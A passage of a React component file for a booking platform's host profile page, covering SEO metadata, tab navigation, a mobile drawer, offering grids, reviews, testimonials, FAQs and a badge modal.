  const reloadMembership = () => getMembershipSpace(profileSlug).then(r => setMembership(r.data || null)).catch(() => {});
  // Offering types the host actually has drive the icon filters + nav (Memberships
  // and Updates are omitted until there's a data source — no empty doorway tabs).
  const showServices = filter === 'all' || filter === 'service';
  const showProducts = (filter === 'all' || filter === 'product') && hasProducts;
  // Grid shows every service (featured hero + intro CTA removed).
  const gridServices = showServices ? services : [];
  const nothingShown = gridServices.length === 0 && !showProducts;

  // Admin-managed SEO → head tags + ProfilePage JSON-LD (only once host loaded).
  // A tab keeps the profile's robots/image but gets its own title, description and
  // canonical (profileTabSeo; MIRRORS the server profile-tab meta shell).
  const baseSeo = host ? resolveProfileSeo({ host, services, siteUrl: SEO_SITE }) : null;
  const seo = baseSeo && tab !== 'services' ? { ...baseSeo, ...profileTabSeo({ tab, host, siteUrl: SEO_SITE }) } : baseSeo;
  // Template FAQs are emitted as FAQPage ONLY when the host has host-specific facts
  // (services or a profession) — otherwise they're generic and thin (guide §5.3).
  // MIRROR this gate in server prerenderController resolveProfileMeta.
  const faqs = host ? profileFaqs({ host, services }) : [];
  const faqsHostSpecific = host && (services.length > 0 || !!host.profession);
  const jsonLd = host ? [profileGraphJsonLd({
    host, siteUrl: SEO_SITE, services, name: seo?.title,
    rating: { avg: reviewData.avg, count: reviewData.count },
    // FAQs render (and are marked up) on the services page only, not repeated per tab.
    faqs: faqsHostSpecific && tab === 'services' ? faqs : [],
  })] : null;

  if (isVanity) return <Navigate to={`/${VANITY_TARGET}`} replace />;

  // A dead slug otherwise renders thin "Host not found" HTML at 200 (a Google "soft
  // 404"). ErrorPage carries noindex/nofollow, so a gone host drops out cleanly; a
  // transient failure uses TransientError (no noindex) so a live page isn't dropped.
  if (error === 'notfound') return <ErrorPage code={404} />;
  if (error === 'transient') return <TransientError message="This profile didn’t load. Please try again." />;
  // A tab only exists while the host has >=1 published item of that type.
  if (host && tabsSettled && !tabHasItems) return <Navigate to={`/${profileSlug}`} replace />;

  // Bring the content back into view only when the visitor has scrolled past its
  // top. Never nudge a page that is already there (the old always-scrollIntoView
  // moved the desktop page a few px on every Services click).
  const toContentTop = () => {
    const el = document.getElementById('offerings');
    if (el && el.getBoundingClientRect().top < 0) el.scrollIntoView({ behavior: 'smooth', block: 'start' });
  };
  // Services + Community are views of /:username; the other tabs are their own URLs.
  const goServicesView = (f) => {
    setFilter(f);
    setNavOpen(false);
    if (tab !== 'services') navigate(`/${profileSlug}`);
    else toContentTop();
  };
  const goTab = (key) => {
    setNavOpen(false);
    if (key !== tab) navigate(`/${profileSlug}/${key}`);
    else toContentTop();
  };

  // Profile tabs. A tab shows only when the host has >=1 published item of that
  // type (`show`), so a services-only host sees Services + Community. Active is
  // derived from the URL tab + the services-page filter (never hardcoded). `icon`
  // is used only by the mobile bottom tab-bar; the desktop rail is text-only.
  const onServices = tab === 'services';
  const SECTIONS = [
    { key: 'service',    label: 'Services',   icon: LayoutGrid,    show: true,          active: onServices && filter !== 'feed', onClick: () => goServicesView('all') },
    { key: 'product',    label: 'Products',   icon: Package,       show: hasProducts,   active: tab === 'products',              onClick: () => goTab('products') },
    { key: 'course',     label: 'Courses',    icon: PlayCircle,    show: hasCourses,    active: tab === 'courses',               onClick: () => goTab('courses') },
    { key: 'membership', label: 'Membership', icon: Crown,         show: hasMembership, active: tab === 'membership',            onClick: () => goTab('membership') },
    { key: 'feed',       label: 'Community',  icon: MessageCircle, show: true,          active: onServices && filter === 'feed', onClick: () => goServicesView('feed') },
  ].filter((s) => s.show);

  // Profile-card stats: the first cell counts what this tab lists (the ACTUAL
  // member count on Membership); Bookings + Rating stay on every tab.
  const firstStat = {
    services:   { n: services.length,               l: 'Services' },
    products:   { n: products.length,               l: 'Products' },
    courses:    { n: courses.length,                l: 'Courses' },
    membership: { n: membership?.member_count || 0, l: 'Members' },
  }[tab] || { n: services.length, l: 'Services' };
  const STATS = [
    firstStat,
    { n: host?.booking_count || 0, l: 'Bookings' },
    { n: reviewData?.avg > 0 ? Number(reviewData.avg).toFixed(1) : '—', l: 'Rating', star: reviewData?.avg > 0 },
  ];

  return (
    <>
      {seo && <Seo {...seo} jsonLd={jsonLd} />}
      <BrandPreloader
        variant="profile"
        ready={!loading && !!host && !error}
        profileName={host?.name}
        accentColor={tc}
      />

      {!host ? (
        // Placeholder, NOT null: these routes are prerendered, so hydration runs
        // with host===null for one API round-trip. Holding viewport height keeps
        // everything below still (avoids CLS).
        <div className="min-h-screen" style={{ background: C.bg }} />
      ) : (
    <div ref={pageRef} className="host-profile min-h-screen flex flex-col" style={{ background: C.bg }}>

      {/* ══ Desktop navbar (lg+): identity left · divider rail centred · CTA right.
          Text-only rail, no icons, no filled active pill — matches the /for chrome. ══ */}
      <nav className="hidden lg:block sticky top-0 z-40" style={{ background: 'rgba(255,255,255,0.88)', backdropFilter: 'blur(10px)', borderBottom: `1px solid ${C.border}` }}
        aria-label={`${host.name} profile navigation`}>
        <div className="app-container relative flex items-center gap-4" style={{ height: 66 }}>
          {/* Left — identity → page top */}
          <a href="#top" className="flex items-center gap-2.5 min-w-0 flex-shrink-0 rounded-full outline-none focus-visible:ring-2 focus-visible:ring-offset-2"
            style={{ '--tw-ring-color': tc }} aria-label={`${host.name} — top of page`}>
            <span className="flex-shrink-0 overflow-hidden flex items-center justify-center"
              style={{ width: 38, height: 38, borderRadius: '50%', background: `${tc}18`, color: tc }}>
              {host.profile_image
                ? <img src={host.profile_image} alt={host.name} width={38} height={38} decoding="async" className="w-full h-full object-cover" />
                : <span className="font-display font-extrabold text-sm">{host.name?.charAt(0)?.toUpperCase()}</span>}
            </span>
            <span className="font-display font-bold text-[15px] truncate" style={{ color: C.text }}>{host.name}</span>
            {host.is_verified && (
              <BadgeCheck className="w-4 h-4 flex-shrink-0" strokeWidth={2.2} style={{ color: tc }} aria-label="Verified" />
            )}
          </a>

          {/* Center — text-only rail: no container, no dividers. Active = bold +
              2px accent underline flush to the navbar's bottom edge. */}
          <div className="absolute left-1/2 -translate-x-1/2 inset-y-0 flex items-stretch gap-6"
            role="tablist" aria-label="Sections">
            {SECTIONS.map((s) => (
              <button key={s.key} type="button" role="tab" aria-selected={s.active} onClick={s.onClick}
                className="relative h-full flex items-center text-sm transition-colors outline-none focus-visible:ring-2 rounded-sm"
                style={{ color: s.active ? tc : C.muted, fontWeight: s.active ? 700 : 500, '--tw-ring-color': tc }}>
                {s.label}
                {s.active && (
                  <span aria-hidden="true" className="absolute left-0 right-0 bottom-0" style={{ height: 2, background: tc }} />
                )}
              </button>
            ))}
          </div>

          {/* Right — CTA */}
          <Link to="/become-a-host"
            className="ml-auto flex-shrink-0 inline-flex items-center gap-1.5 rounded-full font-semibold text-[13.5px] transition-opacity hover:opacity-90"
            style={{ height: 42, padding: '0 18px', background: tc, color: '#fff' }}>
            Start Your Page — Free
          </Link>
        </div>
      </nav>

      {/* ══ Mobile header (below lg): host photo + name left (opens the profile
          drawer) · ee mark right (home). Sections live in the bottom tab-bar. ══ */}
      <header className="lg:hidden sticky top-0 z-40 flex items-center justify-between gap-3"
        style={{ height: 56, padding: '0 16px', background: 'rgba(255,255,255,0.90)', backdropFilter: 'blur(8px)', borderBottom: `1px solid ${C.border}` }}>
        <button type="button" onClick={() => setNavOpen(true)} aria-label={`${host.name} — profile`} aria-expanded={navOpen} aria-controls="profile-drawer"
          className="flex items-center gap-2 min-w-0 rounded-full outline-none focus-visible:ring-2" style={{ '--tw-ring-color': tc }}>
          <span className="relative flex-shrink-0 overflow-hidden flex items-center justify-center" style={{ width: 34, height: 34, borderRadius: '50%', background: `${tc}18`, color: tc }}>
            {host.profile_image
              ? <img src={host.profile_image} alt={host.name} width={34} height={34} decoding="async" className="w-full h-full object-cover" />
              : <span className="font-display font-extrabold text-sm">{host.name?.charAt(0)?.toUpperCase()}</span>}
          </span>
          <span className="font-display font-bold text-[15px] truncate" style={{ color: C.text }}>{host.name}</span>
          {host.is_verified && <BadgeCheck className="w-4 h-4 flex-shrink-0" strokeWidth={2.2} style={{ color: tc }} aria-label="Verified" />}
        </button>
        <Link to="/" className="flex-shrink-0 hover:no-underline" aria-label="Meeticulous — home">
          <img src="/favicon.svg" alt="Meeticulous" width={30} height={30} className="rounded-lg" onError={(e) => { e.currentTarget.style.display = 'none'; }} />
        </Link>
      </header>

      {/* ══ Mobile bottom tab-bar (below lg): section icons ══ */}
      <nav className="lg:hidden fixed left-0 right-0 bottom-0 z-40 flex items-stretch justify-around"
        style={{ background: 'rgba(255,255,255,0.94)', backdropFilter: 'blur(10px)', borderTop: `1px solid ${C.border}`, paddingBottom: 'env(safe-area-inset-bottom, 0px)' }}
        aria-label="Sections">
        {SECTIONS.map((s) => {
          const Icon = s.icon;
          return (
            <button key={s.key} type="button" onClick={s.onClick} aria-current={s.active ? 'true' : undefined}
              className="flex-1 flex flex-col items-center justify-center gap-0.5 outline-none"
              style={{ height: 60, color: s.active ? tc : C.muted, fontSize: 10, fontWeight: s.active ? 600 : 500 }}>
              <Icon className="w-[22px] h-[22px]" strokeWidth={s.active ? 2.3 : 1.9} />
              {s.label}
            </button>
          );
        })}
      </nav>

      {/* ══ Mobile profile drawer — opened by the avatar ══ */}
      {navOpen && (
        <div className="lg:hidden fixed inset-0 z-50" role="dialog" aria-modal="true" aria-label={`${host.name} profile`} id="profile-drawer">
          <div className="absolute inset-0" style={{ background: 'rgba(43,10,20,0.40)' }} onClick={() => setNavOpen(false)} />
          <div className="absolute inset-0 flex flex-col"
            style={{ background: C.card, overflow: 'auto', paddingBottom: 'calc(28px + env(safe-area-inset-bottom, 0px))' }}>
            {/* Grip handle on the sheet — always visible, not over the cover */}
            <div className="flex justify-center flex-shrink-0" style={{ paddingTop: 8, paddingBottom: 6 }}>
              <span aria-hidden="true" style={{ width: 40, height: 4, borderRadius: 4, background: C.border }} />
            </div>
            {/* Cover — a fixed band (host's cover photo, or a branded accent tint) */}
            <div className="relative flex-shrink-0" style={{ height: 120, background: host.cover_image ? `center/cover no-repeat url("${host.cover_image}")` : `linear-gradient(120deg, ${tc}, ${tc}B3)` }}>
              <div aria-hidden="true" className="absolute inset-x-0 top-0" style={{ height: 52, background: 'linear-gradient(rgba(0,0,0,0.28), rgba(0,0,0,0))' }} />
              <button type="button" onClick={() => setNavOpen(false)} aria-label="Close"
                className="absolute flex items-center justify-center rounded-full"
                style={{ top: 12, right: 14, width: 32, height: 32, background: 'rgba(255,255,255,0.95)', color: '#2B0A14', boxShadow: '0 2px 8px rgba(0,0,0,0.20)' }}>
                <X className="w-4 h-4" />
              </button>
            </div>
            <div className="flex flex-col items-center text-center px-5" style={{ marginTop: -44 }}>
              <span className="flex items-center justify-center overflow-hidden flex-shrink-0" style={{ position: 'relative', zIndex: 2, width: 88, height: 88, borderRadius: '50%', background: `${tc}18`, color: tc, border: `2px solid ${C.card}` }}>
                {host.profile_image
                  ? <img src={host.profile_image} alt={host.name} width={88} height={88} className="w-full h-full object-cover" />
                  : <span className="font-display font-extrabold" style={{ fontSize: 34 }}>{host.name?.charAt(0)?.toUpperCase()}</span>}
              </span>
            <span className="font-display font-extrabold text-xl flex items-center gap-1.5" style={{ color: C.text, marginTop: 12 }}>
              {host.name}
              {host.is_verified && <BadgeCheck className="w-[18px] h-[18px]" strokeWidth={2.2} style={{ color: tc }} aria-label="Verified" />}
            </span>
            {(() => {
              const subtitle = [host.primary_category_label || host.profession || host.tagline, host.location].filter(Boolean).join(', ');
              return subtitle ? <p className="text-sm" style={{ color: '#B0A3A0', marginTop: 2 }}>{subtitle}</p> : null;
            })()}
            {bio && (
              <div className="w-full text-left" style={{ marginTop: 10 }}>
                <p className={`text-[12.6px] leading-relaxed ${cardExpanded ? '' : 'line-clamp-2'}`} style={{ color: '#897572' }}>{bio}</p>
                {bio.length > 70 && (
                  <button type="button" onClick={() => setCardExpanded(v => !v)}
                    className="text-[12.6px] font-semibold underline underline-offset-2 transition-opacity hover:opacity-70" style={{ color: C.text }}>
                    {cardExpanded ? 'Show less' : 'Show more'}
                  </button>
                )}
              </div>
            )}

            {/* Stats — inset dividers + uppercase labels */}
            <div className="flex items-center w-full text-center" style={{ marginTop: 16, paddingTop: 16, borderTop: `1px solid ${C.border}` }}>
              {STATS.map((s, i) => (
                <div key={s.l} className="relative flex-1 px-1">
                  {i > 0 && <span aria-hidden="true" className="absolute left-0 top-1/2 -translate-y-1/2 w-px h-7" style={{ background: C.border }} />}
                  <div className="font-display font-extrabold text-[17px] leading-none flex items-center justify-center gap-0.5" style={{ color: C.text }}>
                    {s.n}{s.star && <span className="text-[11px] -mt-0.5" style={{ color: '#F6C35A' }}>★</span>}
                  </div>
                  <div className="text-[10px] font-semibold tracking-wider uppercase mt-1.5" style={{ color: C.muted }}>{s.l}</div>
                </div>
              ))}
            </div>

            {socialLinks.length > 0 && (
              <div className="w-full overflow-hidden" style={{ marginTop: 16, borderRadius: 12, border: `1px solid ${C.border}` }}>
                <button type="button" onClick={() => setLinksOpen(v => !v)} aria-expanded={linksOpen}
                  className="w-full relative flex items-center justify-center gap-2 px-3.5 text-sm font-medium transition-colors hover:bg-black/[0.02] active:bg-black/[0.04]"
                  style={{ height: 44, background: C.card, color: C.text }}>
                  <svg className="w-4 h-4 flex-shrink-0" style={{ color: C.secondary }} fill="none" stroke="currentColor" strokeWidth={2} strokeLinecap="round" strokeLinejoin="round" viewBox="0 0 24 24"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" /><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" /></svg>
                  My Social Media
                  <svg className={`absolute right-3.5 top-1/2 -translate-y-1/2 w-4 h-4 flex-shrink-0 transition-transform ${linksOpen ? 'rotate-180' : ''}`} style={{ color: C.muted }} fill="none" stroke="currentColor" strokeWidth={2} strokeLinecap="round" strokeLinejoin="round" viewBox="0 0 24 24"><path d="m6 9 6 6 6-6" /></svg>
                </button>
                <div className="overflow-hidden transition-all duration-300 ease-out" style={{ maxHeight: linksOpen ? 120 : 0, opacity: linksOpen ? 1 : 0 }}>
                  <div className="p-3 flex flex-wrap justify-center gap-2" style={{ borderTop: `1px solid ${C.border}` }}>
                    {socialLinks.map(({ key, href }) => <SocialIcon key={key} platform={key} href={href} />)}
                  </div>
                </div>
              </div>
            )}

            {badges.length > 0 && (
              <div className="w-full" style={{ marginTop: 16 }}>
                <div className="text-[10px] font-semibold tracking-wider uppercase mb-2 text-center" style={{ color: C.muted }}>Badges</div>
                <div className="flex flex-wrap justify-center gap-1">
                  {badges.map((b, i) => <Badge key={i} badge={b} onSelect={setBadgeInfo} />)}
                </div>
              </div>
            )}

            <button type="button" onClick={() => goServicesView('all')}
              className="w-full flex items-center justify-center rounded-full font-semibold text-sm transition-opacity hover:opacity-90"
              style={{ height: 46, background: tc, color: '#fff', marginTop: 18 }}>
              Book a session
            </button>
            </div>
          </div>
        </div>
      )}

      {host.is_verified === false && (
        <div className="px-4 py-2 text-center text-sm"
          style={{ background: '#FDF0D2', color: '#5A3A00' }}>
          ⚠️ This creator's account is pending admin verification.
        </div>
      )}

      <div id="top" className="app-container pt-6 pb-24 lg:pb-16 flex-1">

        {isDemo && (
          <div className="mb-5 flex flex-wrap items-center gap-2 rounded-2xl p-2"
            style={{ background: C.card, border: `2px solid ${tc}33` }}>
            <span className="px-2 text-xs font-bold uppercase tracking-wide" style={{ color: C.secondary }}>
              Demo · view as
            </span>
            {[{ key: null, label: 'Default' }, ...DEMO_PERSONAS].map((p) => {
              const active = personaKey === p.key;
              return (
                <button key={p.key || 'base'} onClick={() => applyPersona(p.key)}
                  className="px-3 py-1.5 rounded-full text-sm font-semibold transition-colors"
                  style={active
                    ? { background: tc, color: '#fff' }
                    : { background: `${tc}12`, color: C.text }}>
                  {p.label}
                </button>
              );
            })}
          </div>
        )}

        <div className="flex flex-col lg:flex-row gap-7 items-start">

          {/* ── LEFT — identity card with cover banner (desktop only; on mobile the
                profile lives in the corner-avatar drawer) ──────────────── */}
          <aside className="hidden lg:block w-full max-w-md mx-auto lg:mx-0 lg:max-w-none lg:w-[320px] lg:flex-shrink-0 lg:sticky lg:top-[90px] lg:max-h-[calc(100vh-106px)] lg:overflow-y-auto [scrollbar-width:none] [&::-webkit-scrollbar]:hidden">
            <div className="rounded-3xl overflow-hidden" style={{ background: C.card, border: `1px solid ${C.border}` }}>
              {/* Cover — host's, or the branded default. 90px band; avatar overlaps in front. */}
              <HostCover src={host.cover_image} themeColor={tc} eager className="w-full" style={{ height: 90, aspectRatio: 'auto' }} />
              <div className="px-6 pb-6 text-center">

                {/* Avatar — overlaps the cover, in front */}
                <div className="flex justify-center relative -mt-10" style={{ zIndex: 2 }}>
                  <div className="relative overflow-hidden flex items-center justify-center"
                    style={{ width: 80, height: 80, borderRadius: '50%', background: `${tc}18`, border: `2px solid ${C.card}` }}>
                    {host.profile_image
                      ? <img src={host.profile_image} alt={host.name} width={80} height={80} fetchpriority="high" decoding="async" className="w-full h-full object-cover" />
                      : <span className="font-display font-extrabold text-3xl" style={{ color: tc }}>{host.name?.charAt(0)?.toUpperCase()}</span>}
                  </div>
                </div>

                {/* Name + verified mark + profession */}
                <h1 className="font-display font-extrabold text-xl mt-3 flex items-center justify-center gap-1.5" style={{ color: C.text }}>
                  {host.name}
                  {host.is_verified && <BadgeCheck className="w-5 h-5 flex-shrink-0" strokeWidth={2.2} style={{ color: tc }} aria-label="Verified" />}
                </h1>
                {/* Category, location — one muted line, tight to the name */}
                {(() => {
                  const subtitle = [host.primary_category_label || host.profession || host.tagline, host.location].filter(Boolean).join(', ');
                  return subtitle ? <p className="text-sm -mt-1.5" style={{ color: '#B0A3A0' }}>{subtitle}</p> : null;
                })()}

                {/* About — bio in the host's accent colour, Show more inline on the 3rd line */}
                {bio && (
                  <div className="mt-1.5">
                    <p className={`text-[12.6px] leading-relaxed ${cardExpanded ? '' : 'line-clamp-2'}`} style={{ color: '#897572' }}>{bio}</p>
                    {bio.length > 70 && (
                      <button type="button" onClick={() => setCardExpanded(v => !v)}
                        className="text-[12.6px] font-semibold underline underline-offset-2 transition-opacity hover:opacity-70" style={{ color: C.text }}>
                        {cardExpanded ? 'Show less' : 'Show more'}
                      </button>
                    )}
                  </div>
                )}

                {/* Stats — three cells with inset dividers + uppercase labels */}
                <div className="flex items-center mt-4 pt-4 text-center" style={{ borderTop: `1px solid ${C.border}` }}>
                  {STATS.map((s, i) => (
                    <div key={s.l} className="relative flex-1 px-1">
                      {i > 0 && <span aria-hidden="true" className="absolute left-0 top-1/2 -translate-y-1/2 w-px h-7" style={{ background: C.border }} />}
                      <div className="font-display font-extrabold text-[17px] leading-none flex items-center justify-center gap-0.5" style={{ color: C.text }}>
                        {s.n}{s.star && <span className="text-[11px] -mt-0.5" style={{ color: '#F6C35A' }}>★</span>}
                      </div>
                      <div className="text-[10px] font-semibold tracking-wider uppercase mt-1.5" style={{ color: C.muted }}>{s.l}</div>
                    </div>
                  ))}
                </div>

                {/* Link in Bio — collapsible: socials, centered button */}
                {(websiteUrl !== '#' || socialLinks.length > 0) && (
                  <div className="mt-5 overflow-hidden" style={{ borderRadius: 12, border: `1px solid ${C.border}` }}>
                    <button type="button" onClick={() => setLinksOpen(v => !v)} aria-expanded={linksOpen}
                      className="w-full relative flex items-center justify-center gap-2 px-3.5 text-sm font-medium transition-colors hover:bg-black/[0.02] active:bg-black/[0.04]"
                      style={{ height: 44, background: C.card, color: C.text }}>
                      <svg className="w-4 h-4 flex-shrink-0" style={{ color: C.secondary }} fill="none" stroke="currentColor" strokeWidth={2} strokeLinecap="round" strokeLinejoin="round" viewBox="0 0 24 24"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71" /><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71" /></svg>
                      My Social Media
                      <svg className={`absolute right-3.5 top-1/2 -translate-y-1/2 w-4 h-4 flex-shrink-0 transition-transform ${linksOpen ? 'rotate-180' : ''}`} style={{ color: C.muted }} fill="none" stroke="currentColor" strokeWidth={2} strokeLinecap="round" strokeLinejoin="round" viewBox="0 0 24 24"><path d="m6 9 6 6 6-6" /></svg>
                    </button>
                    {socialLinks.length > 0 && (
                      <div className="overflow-hidden transition-all duration-300 ease-out"
                        style={{ maxHeight: linksOpen ? 120 : 0, opacity: linksOpen ? 1 : 0 }}>
                        <div className="p-3 flex flex-wrap justify-center gap-2" style={{ borderTop: `1px solid ${C.border}` }}>
                          {socialLinks.map(({ key, href }) => <SocialIcon key={key} platform={key} href={href} />)}
                        </div>
                      </div>
                    )}
                  </div>
                )}

                {/* Badges — labeled, at the bottom */}
                {badges.length > 0 && (
                  <div className="mt-5">
                    <div className="text-[10px] font-semibold tracking-wide uppercase mb-2" style={{ color: C.muted }}>Badges</div>
                    <div className="flex flex-wrap justify-center gap-1">
                      {badges.map((b, i) => <Badge key={i} badge={b} onSelect={setBadgeInfo} />)}
                    </div>
                  </div>
                )}
              </div>
            </div>
          </aside>

          {/* ── RIGHT — offerings ──────────────────────── */}
          <section className="w-full lg:flex-1 min-w-0">

            {/* Anchor for the profile nav's scroll-to (header/intro/featured removed) */}
            <div id="offerings" style={{ scrollMarginTop: 82 }} />

            {tab === 'products' ? (
              <>
                <ProfileTabHeading eyebrow={`${firstName}'s`} title="Digital products" C={C} />
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  {products.map(p => <ProductCard key={p.id} product={p} profileSlug={profileSlug} />)}
                </div>
              </>
            ) : tab === 'courses' ? (
              <>
                <ProfileTabHeading eyebrow={`${firstName}'s`} title="Courses" C={C} />
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  {courses.map(c => <CourseCard key={c.id} course={c} profileSlug={profileSlug} C={C} />)}
                </div>
              </>
            ) : tab === 'membership' ? (
              membership && <ProfileMembership username={profileSlug} data={membership} onReload={reloadMembership} C={C} />
            ) : filter === 'feed' ? <ProfileFeed host={host} profileSlug={profileSlug} tc={tc} /> : (<>

            {/* Services grid */}
            {showServices && gridServices.length > 0 && (
              <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
                {gridServices.map(s => (
                  <ServiceCard key={s.id} service={s} profileSlug={profileSlug} />
                ))}
              </div>
            )}

            {/* Products */}
            {showProducts && (
              <div className={showServices && gridServices.length ? 'mt-6' : ''}>
                {filter === 'all' && <h3 className="font-display font-bold text-lg mb-4" style={{ color: C.text }}>Digital Products</h3>}
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  {products.map(p => (
                    <ProductCard key={p.id} product={p} profileSlug={profileSlug} />
                  ))}
                </div>
              </div>
            )}

            {/* Empty state — message + request form (services/products/courses) */}
            {nothingShown && (
              <OfferingEmpty
                type="service"
                hostName={host.name} profileSlug={profileSlug} tc={tc} C={C} />
            )}

            </>)}

            {/* Reviews / testimonials / FAQ belong to the services page, not every tab. */}
            {onServices && (<>
            {/* Reviews */}
            {reviewData.count > 0 && (
              <div className="mt-10">
                <button onClick={() => setShowReviews(v => !v)} className="flex items-center gap-3 mb-4">
                  <h2 className="font-display font-bold text-xl" style={{ color: C.text }}>What people say</h2>
                  <Stars avg={reviewData.avg} count={reviewData.count} size="lg" />
                  <svg className={`w-4 h-4 transition-transform ${showReviews ? 'rotate-180' : ''}`}
                    style={{ color: C.muted }} fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
                  </svg>
                </button>
                {showReviews && (
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    {reviewData.reviews.map(r => (
                      <div key={r.id} className="rounded-2xl p-4" style={{ background: C.card, border: `1px solid ${C.border}` }}>
                        <div className="flex items-start gap-3">
                          <div className="w-9 h-9 rounded-full flex items-center justify-center text-sm font-bold flex-shrink-0"
                            style={{ background: tc, color: '#fff' }}>
                            {r.profiles?.name?.charAt(0) || '?'}
                          </div>
                          <div className="flex-1 min-w-0">
                            <div className="flex items-center gap-2 mb-1">
                              <span className="text-sm font-semibold" style={{ color: C.text }}>{r.profiles?.name || 'Anonymous'}</span>
                              <Stars avg={r.rating} count={0} />
                            </div>
                            {r.comment && <p className="text-sm leading-relaxed" style={{ color: C.secondary }}>{r.comment}</p>}
                            <p className="text-xs mt-1" style={{ color: C.muted }}>
                              {new Date(r.created_at).toLocaleDateString('en-IN', { month: 'short', day: 'numeric', year: 'numeric' })}
                            </p>
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            )}

            {/* Testimonials — HOST-PROVIDED quotes (a proof wall). Deliberately
                distinct from the verified "What people say" reviews above, and
                NOT counted in the star rating / aggregateRating. */}
            {testimonials.length > 0 && (
              <div className="mt-10 rounded-2xl p-5 sm:p-6" style={{ background: tc + '0D', border: `1px solid ${C.border}` }}>
                <div className="flex items-center gap-2 mb-1">
                  <h2 className="font-display font-bold text-xl" style={{ color: C.text }}>Testimonials</h2>
                  <span className="text-[11px] font-semibold uppercase tracking-wide rounded-full px-2 py-0.5"
                    style={{ background: tc + '1A', color: tc }}>Host-provided</span>
                </div>
                <p className="text-xs mb-4" style={{ color: C.muted }}>Praise shared directly by {host?.name || 'the host'}.</p>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  {testimonials.map(t => (
                    <blockquote key={t.id} className="rounded-2xl p-4" style={{ background: C.card, border: `1px solid ${C.border}` }}>
                      <svg className="w-6 h-6 mb-2 opacity-40" fill="currentColor" viewBox="0 0 24 24" style={{ color: tc }}>
                        <path d="M7.17 6A5.17 5.17 0 002 11.17V18h6.83v-6.83H5.5A1.67 1.67 0 017.17 9.5V6zm9 0A5.17 5.17 0 0011 11.17V18h6.83v-6.83H14.5A1.67 1.67 0 0116.17 9.5V6z" />
                      </svg>
                      <p className="text-sm leading-relaxed" style={{ color: C.secondary }}>{t.quote}</p>
                      <footer className="flex items-center gap-3 mt-3">
                        {t.author_image_url ? (
                          <img src={t.author_image_url} alt="" className="w-8 h-8 rounded-full object-cover flex-shrink-0" />
                        ) : (
                          <div className="w-8 h-8 rounded-full flex items-center justify-center text-xs font-bold flex-shrink-0"
                            style={{ background: tc, color: '#fff' }}>{t.author_name?.charAt(0) || '?'}</div>
                        )}
                        <div className="min-w-0">
                          <div className="text-sm font-semibold truncate" style={{ color: C.text }}>{t.author_name}</div>
                          {t.author_role && <div className="text-xs truncate" style={{ color: C.muted }}>{t.author_role}</div>}
                        </div>
                      </footer>
                    </blockquote>
                  ))}
                </div>
              </div>
            )}

            {/* FAQ — templated from real profile data; powers the FAQPage schema. */}
            {faqs.length > 0 && (
              <div className="mt-10">
                <h2 className="font-display font-bold text-xl mb-4" style={{ color: C.text }}>Frequently asked questions</h2>
                <FaqAccordion faqs={faqs} colors={C} />
              </div>
            )}
            </>)}
          </section>
        </div>
      </div>

      <Footer />
    </div>
      )}

      {/* Badge detail — centered modal (tap-outside or ✕ to close). */}
      {badgeInfo && (
        <div className="fixed inset-0 z-[70] flex items-center justify-center p-4"
          style={{ background: 'rgba(43,10,20,0.45)', backdropFilter: 'blur(2px)' }}
          onClick={() => setBadgeInfo(null)} role="dialog" aria-modal="true" aria-label={badgeInfo.name || 'Badge'}>
          <div className="relative w-full max-w-[320px] rounded-3xl p-7 text-center"
            style={{ background: C.card, boxShadow: '0 24px 64px rgba(43,10,20,0.30)' }}
            onClick={(e) => e.stopPropagation()}>
            <button type="button" onClick={() => setBadgeInfo(null)} aria-label="Close"
              className="absolute flex items-center justify-center rounded-full transition-colors hover:bg-black/[0.05]"
              style={{ top: 12, right: 12, width: 30, height: 30, color: C.muted }}>
              <X className="w-4 h-4" />
            </button>
            <div className="mx-auto flex items-center justify-center overflow-hidden"
              style={{ width: 64, height: 64, borderRadius: 18, background: `${tc}12`, border: `1px solid ${C.border}` }}>
              {badgeInfo.image_url
                ? <img src={badgeInfo.image_url} alt="" className="w-full h-full object-contain p-2" />
                : <span className="font-display font-extrabold text-2xl" style={{ color: tc }}>{(badgeInfo.name || 'B').charAt(0).toUpperCase()}</span>}
            </div>
            <h3 className="font-display font-extrabold text-lg mt-4" style={{ color: C.text }}>{badgeInfo.name}</h3>
            {badgeInfo.description && (
              <p className="text-sm leading-relaxed mt-2" style={{ color: C.secondary }}>{badgeInfo.description}</p>
            )}
            <button type="button" onClick={() => setBadgeInfo(null)}
              className="w-full mt-6 flex items-center justify-center rounded-full font-semibold text-sm transition-opacity hover:opacity-90"
              style={{ height: 42, background: tc, color: '#fff' }}>
              Got it
            </button>
          </div>
        </div>
      )}

      <MembershipModal open={memberOpen} onClose={() => setMemberOpen(false)} tc={tc} />
    </>
  );
};

export default HostProfile;
